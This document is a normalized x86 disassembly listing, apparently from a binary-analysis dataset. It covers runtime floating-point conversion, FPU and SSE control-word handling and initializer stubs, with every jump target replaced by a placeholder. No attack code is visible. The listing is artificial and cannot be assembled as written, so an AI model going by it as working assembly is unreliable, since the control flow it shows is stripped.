add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
cmp si bx
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
and ecx 0x7
sar ebx 0x3
test ecx ecx
je r-xdata
cmp esi eax
jne r-xdata
cmp esi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_40d92c
add esp 0xc
xor esi esi
test eax eax
je r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
push 0x8
sub esi 0x3ffe
mov [ ebp - 0x16 ] ax
pop ebx
mov [ ebp + 0x14 ] ecx
and [ edx ] 0x0
cmp [ ebp - 0x6c ] 0x8000
mov [ edx + 0x3 ] 0x1
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x4 ] 0x30
mov [ edx + 0x5 ] 0x0
jmp r-xdata
cmp di 0xbffd
ja r-xdata
test ebx ebx
jne r-xdata
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
cmp [ ecx ] 0x8000
mov [ ebp - 0x64 ] ecx
jb r-xdata
push r--data
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebx + 0x3 ] 0x6
push esi
push esi
push esi
push esi
push esi
call sub_40f4c3
add esp 0x14
mov eax [ ebp - 0x20 ]
mov edi [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add edi edi
or edi eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec ebx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jge r-xdata
xor eax eax
inc eax
jmp r-xdata
cmp di 0x3fbf
ja r-xdata
xor eax eax
movzx edi [ ecx + 0xa ]
mov edx [ ebp - 0x16 ]
xor eax eax
mov ecx edi
mov esi 0x7fff
xor ecx edx
and edx esi
and edi esi
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
and ecx 0x8000
cmp dx si
lea eax [ edi + edx ]
movzx eax ax
jae r-xdata
mov esi ecx
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x64 ] eax
mov ecx eax
push r--data
push r--data
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc eax
test eax eax
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
cmp dx ax
jne r-xdata
mov [ ebp - 0x18 ] eax
jmp r-xdata
neg cx
sbb ecx ecx
and [ ebp - 0x1c ] 0x0
and ecx 0x80000000
add ecx 0x7fff8000
and [ ebp - 0x20 ] 0x0
mov [ ebp - 0x18 ] ecx
cmp di si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40f4c3
add esp 0x14
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_40d92c
add esp 0xc
xor esi esi
test eax eax
je r-xdata
dec ebx
mov al [ ebx ]
dec ebx
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov edi [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
test esi esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] eax
jg r-xdata
cmp si ax
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
cmp ax 0xbffd
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
and [ ebp - 0x54 ] 0x0
lea eax [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ax 0x3fbf
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
cmp ebx [ ebp - 0x40 ]
mov eax [ ebp - 0x60 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
cmp edx esi
mov [ ebp - 0x44 ] edx
jb r-xdata
inc eax
inc eax
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea esi [ ebp - 0x28 ]
lea edx [ ebp + edx - 0x20 ]
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x48 ] edx
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
cmp ebx ecx
mov eax [ ebp - 0x60 ]
jae r-xdata
inc ecx
test edx edx
mov esi eax
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov edx [ ebp - 0x54 ]
mov esi [ ebp - 0x40 ]
add edx edx
test esi esi
mov [ ebp - 0x50 ] esi
jle r-xdata
add edi 0xc002
xor eax eax
cmp di ax
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx edx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp di si
jne r-xdata
inc eax
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
and [ eax ] 0x0
cmp [ ebp - 0x6c ] 0x8000
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add edi 0xffff
cmp di ax
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x48 ] 0x2
sub [ ebp - 0x5c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ eax ]
cmp [ ebp - 0x44 ] 0x0
mov [ eax - 0x4 ] ebx
je r-xdata
lea edi [ ebp - 0xc ]
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x44 ] edi
mov [ ebp - 0x40 ] 0x5
mov edx [ ebp - 0x64 ]
inc eax
test [ edx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
cmp [ ebp - 0x10 ] 0x8000
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
cmp di ax
jg r-xdata
mov edx [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shl [ ebp - 0x10 ] 0x1
shr edx 0x1f
add ebx ebx
or ebx edx
mov edx [ ebp - 0x8 ]
shr esi 0x1f
add edx edx
or edx esi
add edi 0xffff
cmp di ax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] edx
jg r-xdata
mov edx [ ebp - 0x5c ]
mov esi [ ebp - 0x48 ]
movzx esi [ esi ]
movzx edx [ edx ]
and [ ebp - 0x44 ] 0x0
imul edx esi
mov esi [ eax - 0x4 ]
lea ebx [ esi + edx ]
cmp ebx esi
jb r-xdata
inc edi
inc edi
inc [ ebp - 0x5c ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
mov [ ebp - 0x44 ] edi
jg r-xdata
lea edx [ ebp + edx - 0x20 ]
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x64 ]
add edx 0x8
mov [ ebp - 0x54 ] edx
cmp [ edx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x10 ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl edx 0x1f
shr ebx 0x1
or ebx edx
mov edx [ ebp - 0x10 ]
shl esi 0x1f
shr edx 0x1
or edx esi
dec eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] edx
jne r-xdata
inc [ ebp - 0x58 ]
mov edx [ ebp - 0x5c ]
mov esi [ ebp - 0x40 ]
add edx edx
test esi esi
mov [ ebp - 0x50 ] esi
jle r-xdata
add eax 0xc002
test ax ax
jle r-xdata
mov [ ebp - 0x70 ] 0x1
cmp esi edx
jae r-xdata
cmp [ edx ] esi
jne r-xdata
mov [ ebp - 0x16 ] si
jmp r-xdata
inc [ ebp - 0xe ]
cmp [ ebp - 0xa ] 0xffffffff
mov [ ebp - 0xe ] eax
jne r-xdata
cmp di 0x7fff
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x58 ] eax
je r-xdata
add eax 0xffff
test ax ax
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x58 ] 0x2
sub [ ebp - 0x54 ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x70 ] 0x0
mov edi [ ebp - 0x44 ]
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov ax [ ebp - 0xe ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
or edi ecx
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
neg cx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
sbb ecx ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
cmp [ ebp - 0x6 ] 0xffff
mov [ ebp - 0xa ] eax
jne r-xdata
or [ ebp - 0x10 ] 0x1
cmp [ ebp - 0x10 ] 0x8000
ja r-xdata
mov edx eax
neg edx
movzx edx dx
mov [ ebp - 0x44 ] edx
add eax edx
test ax ax
jg r-xdata
mov edx [ ebp - 0x10 ]
mov edi [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shl [ ebp - 0x10 ] 0x1
shr edx 0x1f
add edi edi
or edi edx
mov edx [ ebp - 0x8 ]
shr esi 0x1f
add edx edx
or edx esi
add eax 0xffff
test ax ax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edx
jg r-xdata
mov edx [ ebp - 0x58 ]
mov esi [ ebp - 0x54 ]
movzx esi [ esi ]
movzx edx [ edx ]
mov edi [ edi - 0x4 ]
imul edx esi
and [ ebp - 0x70 ] 0x0
lea esi [ edi + edx ]
cmp esi edi
jb r-xdata
xor eax eax
jmp r-xdata
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] 0x8000
inc edi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x10 ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov edx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esi [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl edx 0x1f
shr edi 0x1
or edi edx
mov edx [ ebp - 0x10 ]
shl esi 0x1f
shr edx 0x1
or edx esi
dec [ ebp - 0x44 ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] edx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
cmp ax 0x7fff
jae r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] 0x0
je r-xdata
mov dx [ ebp - 0xe ]
mov [ ebp - 0x20 ] dx
mov edx [ ebp - 0xc ]
mov [ ebp - 0x1e ] edx
mov edx [ ebp - 0x8 ]
or eax ecx
mov [ ebp - 0x1a ] edx
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
cmp [ ebp - 0x6 ] 0xffff
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] 0x8000
inc eax
jmp r-xdata
sub_4154c6
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
test ebx 0x40000
pop esi
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_415554
xor eax eax
test dl 0x10
je r-xdata
test dl 0x8
push ebx
push esi
push edi
mov ebx 0x200
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
test edx 0x80000
mov edi 0x100
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
cmp edx 0x1000000
pop esi
pop ebx
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_4155f4
sub esp 0x10
push ebx
push ebp
push esi
push edi
fwait
fnstcw [ esp + 0x14 ]
mov ebx [ esp + 0x14 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov edi 0xc00
and eax edi
mov ebp 0x300
mov esi 0x200
je r-xdata
or edx 0x80000
and ecx ebp
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx esi
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov esi [ esp + 0x28 ]
mov ecx [ esp + 0x24 ]
mov eax esi
not eax
and eax edx
and ecx esi
or eax ecx
cmp eax edx
mov [ esp + 0x1c ] eax
je r-xdata
or edx 0x40000
test bx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx esi
jmp r-xdata
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx eax
call sub_4154c6
movzx eax ax
mov [ esp + 0x10 ] eax
fldcw [ esp + 0x10 ]
fwait
fnstcw [ esp + 0x10 ]
mov ebx [ esp + 0x10 ]
xor edx edx
test bl 0x1
je r-xdata
or edx ebp
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
and esi 0x308031f
mov edi esi
stmxcsr [ esp + 0x18 ]
mov eax [ esp + 0x18 ]
xor esi esi
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test ax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test ax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test ax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test ax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test ax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax edi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebp 0x6000
and ecx ebp
je r-xdata
or esi 0x80000
and ecx ebp
je r-xdata
cmp eax 0x400
je r-xdata
mov ebx 0x8040
and eax ebx
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov eax edx
mov [ esp + 0x1c ] edx
or edx 0x40000
test bx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax edi
jne r-xdata
call sub_415554
push eax
mov [ esp + 0x2c ] eax
call sub_415ac3
pop ecx
stmxcsr [ esp + 0x28 ]
mov eax [ esp + 0x28 ]
xor edx edx
test al al
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebp
jne r-xdata
or edx ebp
jmp r-xdata
mov edi 0x200
test edi eax
je r-xdata
push 0x10
pop edx
mov ecx [ esp + 0x1c ]
mov edx eax
xor edx ecx
or eax ecx
test edx 0x8031f
je r-xdata
mov edx edi
and edi [ esp + 0x24 ]
not edx
and edx esi
or edx edi
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ax 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ax 0x800
je r-xdata
or edx 0x4
test ax 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi eax
je r-xdata
or edx 0x1
mov ecx eax
and ecx ebp
je r-xdata
or edx 0x80000
and eax ebx
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x2000000
sub eax 0x7fc0
je r-xdata
or edx esi
cmp ecx 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or edx edi
jmp r-xdata
cmp ecx ebp
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_4158f7
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
xor esi esi
cmp [ ebp + 0xc ] esi
push edi
mov [ ebp - 0x18 ] 0x404e
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
jbe r-xdata
cmp [ eax + 0x8 ] esi
je r-xdata
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx edx
shr ecx 0x1f
lea edi [ edx + edx ]
lea edx [ ebx + ebx ]
or edx ecx
mov ecx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
add ecx ecx
or ecx esi
mov [ ebp - 0x14 ] edi
mov esi edi
and [ ebp - 0x14 ] 0x0
mov ebx edx
shr ebx 0x1f
add ecx ecx
shr edi 0x1f
or ecx ebx
mov ebx [ ebp - 0x10 ]
add esi esi
add edx edx
or edx edi
lea edi [ esi + ebx ]
cmp edi esi
mov [ eax ] esi
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
jb r-xdata
mov ecx [ eax + 0x4 ]
mov edx ecx
shr edx 0x10
mov [ eax + 0x8 ] edx
mov edx [ eax ]
mov edi edx
shl ecx 0x10
shr edi 0x10
or ecx edi
shl edx 0x10
add [ ebp - 0x18 ] 0xfff0
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
mov ebx 0x8000
test [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x1
cmp edi ebx
jae r-xdata
mov cx [ ebp - 0x18 ]
mov [ eax + 0xa ] cx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40fd18
leave
retn
mov esi [ eax ]
mov edi [ eax + 0x4 ]
add [ ebp - 0x18 ] 0xffff
mov ecx esi
add esi esi
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
add ecx ecx
or ecx edx
test ebx ecx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea ebx [ ecx + edx ]
xor esi esi
cmp ebx ecx
jb r-xdata
lea esi [ edx + 0x1 ]
cmp esi edx
jb r-xdata
xor ebx ebx
cmp [ ebp - 0x14 ] ebx
mov [ eax ] edi
je r-xdata
xor esi esi
inc esi
cmp ebx edx
jae r-xdata
xor ebx ebx
inc ebx
cmp esi 0x1
jae r-xdata
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
and [ ebp - 0x14 ] 0x0
lea ecx [ edi + edi ]
mov edx edi
shr edx 0x1f
lea edi [ ebx + ebx ]
or edi edx
mov edx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
lea ebx [ edx + edx ]
mov edx [ ebp + 0x8 ]
or ebx esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ebx
movsx edx [ edx ]
lea esi [ ecx + edx ]
cmp esi ecx
mov [ ebp - 0x10 ] edx
jb r-xdata
inc [ eax + 0x8 ]
test esi esi
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
test ebx ebx
mov [ eax + 0x4 ] esi
je r-xdata
mov [ ebp - 0x14 ] 0x1
cmp esi edx
jae r-xdata
dec [ ebp + 0xc ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
ja r-xdata
lea ecx [ edi + 0x1 ]
xor edx edx
cmp ecx edi
jb r-xdata
cmp [ ebp - 0x14 ] 0x0
mov [ eax ] esi
je r-xdata
xor esi esi
jmp r-xdata
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
inc ebx
mov [ eax + 0x8 ] ebx
test edx edx
mov [ eax + 0x4 ] ecx
je r-xdata
sub_415ac3
push 0x8
push r--data
call sub_40c69c
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_40c6e1
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_415c3d
mov eax sub_415c18
call sub_411740
push esi
mov esi rw-data
call sub_401311
or [ esp + 0xc ] 0xffffffff
push sub_415ee8
call sub_40aff9
pop ecx
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_415cad
push ebx
push esi
mov [ rw-data ] sub_404683
mov [ rw-data ] 0x10015601
mov [ rw-data ] 0x5a
mov [ rw-data ] 0x0
call sub_402a24
mov ebx rw-data
mov esi eax
call sub_402552
pop esi
pop ebx
retn
sub_415ce8
push ebx
push esi
mov [ rw-data ] sub_404cc2
mov [ rw-data ] 0x10653301
mov [ rw-data ] 0x5a
mov [ rw-data ] 0x0
call sub_402a24
mov ebx rw-data
mov esi eax
call sub_402552
pop esi
pop ebx
retn
sub_415d23
push ebx
push esi
mov [ rw-data ] sub_404ec5
mov [ rw-data ] 0x10018101
mov [ rw-data ] 0x14
mov [ rw-data ] 0x0
call sub_402a24
mov ebx rw-data
mov esi eax
call sub_402552
pop esi
pop ebx
retn
sub_415d5e
push ebx
push esi
mov [ rw-data ] sub_40518f
mov [ rw-data ] 0x10740121
mov [ rw-data ] 0x5a
mov [ rw-data ] 0x0
call sub_402a24
mov ebx rw-data
mov esi eax
call sub_402552
pop esi
pop ebx
retn
sub_415d99
push ebx
push esi
mov [ rw-data ] sub_405347
mov [ rw-data ] 0x10000301
mov [ rw-data ] 0x32
mov [ rw-data ] 0x0
call sub_402a24
mov ebx rw-data
mov esi eax
call sub_402552
pop esi
pop ebx
retn
sub_415dd4
push ebx
push esi
mov [ rw-data ] sub_405581
mov [ rw-data ] 0x10001401
mov [ rw-data ] 0x3c
mov [ rw-data ] 0x0
call sub_402a24
mov ebx rw-data
mov esi eax
call sub_402552
pop esi
pop ebx
retn
sub_415e19
and [ rw-data ] 0x0
push esi
mov [ rw-data ] sub_40571b
mov [ rw-data ] 0x702f3f00
call sub_402a24
mov esi eax
xor eax eax
mov ecx rw-data
cmp eax ecx
je r-xdata
pop esi
retn
mov eax [ esi + 0x4118 ]
test eax eax
jl r-xdata
cmp eax 0x20
jge r-xdata
imul eax eax 0xe4
push 0xe4
push ecx
lea eax [ eax + esi + 0x2498 ]
push eax
call sub_40ab70
add esp 0xc
inc [ esi + 0x4118 ]
sub_415ee8
mov eax sub_415c18
call sub_411740
push esi
or [ esp + 0xc ] 0xffffffff
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop esi
leave
retn
call sub_402a24
push [ rw-data ]
call sub_40391f
sub_401334
cmp [ esi ] 0x0
je r-xdata
retn
call sub_402a24
push [ esi ]
call sub_40391f
sub_4015ec
mov eax [ ebp + 0x8 ]
mov [ eax + 0x10 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_401aa8
mov eax [ ecx + 0xc ]
retn
sub_401aac
mov eax ecx
and [ eax ] 0x0
push 0x40
pop edx
lea ecx [ eax + 0x4 ]
mov [ ecx ] 0x0
inc ecx
dec edx
jne r-xdata
retn
sub_401b7c
mov eax sub_415b73
call sub_411740
push ecx
mov [ ebp - 0x10 ] ecx
or [ ebp - 0x4 ] 0xffffffff
call sub_401b9f
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_401b9f
mov eax sub_415b4f
call sub_411740
push ecx
mov [ ebp - 0x10 ] ecx
or [ ebp - 0x4 ] 0xffffffff
call sub_40b650
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_401c56
push esi
mov esi ecx
call sub_401b7c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40ba40
pop ecx
sub_401c72
push esi
mov esi ecx
call sub_401b9f
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40ba40
pop ecx
sub_401d4e
xor eax eax
retn 0x4
sub_4027f2
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
inc [ eax ]
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_4028bd
mov eax [ ebp + 0x8 ]
inc [ eax + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_40298b
mov eax [ ebp + 0x8 ]
inc [ eax + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_40382c
cmp [ ebp - 0x3c ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
push [ ebp - 0x3c ]
call [ CloseHandle@IAT ]
retn
